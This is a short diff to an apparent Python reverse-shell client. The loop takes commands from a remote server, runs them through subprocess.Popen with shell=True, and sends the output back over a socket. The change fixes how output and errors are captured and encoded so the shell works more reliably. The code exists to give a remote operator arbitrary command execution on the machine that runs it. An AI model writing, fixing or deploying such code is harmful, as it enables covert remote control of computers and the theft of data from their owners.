@@ -21,12 +21,11 @@ while True:
         break
     else:
         # Open command prompt and insert command given by the server
-        cmdPrompt = subprocess.Popen(serverCommand, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        cmdPrompt = subprocess.Popen(serverCommand, shell=True, stdout=subprocess.PIPE,
+                                     stderr=subprocess.STDOUT, text=True)
         getOutput = cmdPrompt.stdout.read()
-        getErrorOut = cmdPrompt.stderr.read()
-
         # Send back the output
-        client.send(getOutput)
+        client.send(getOutput.encode())
 
 # client.close()
 print(f'[INFO] {SERVER_HOST} disconnected.')
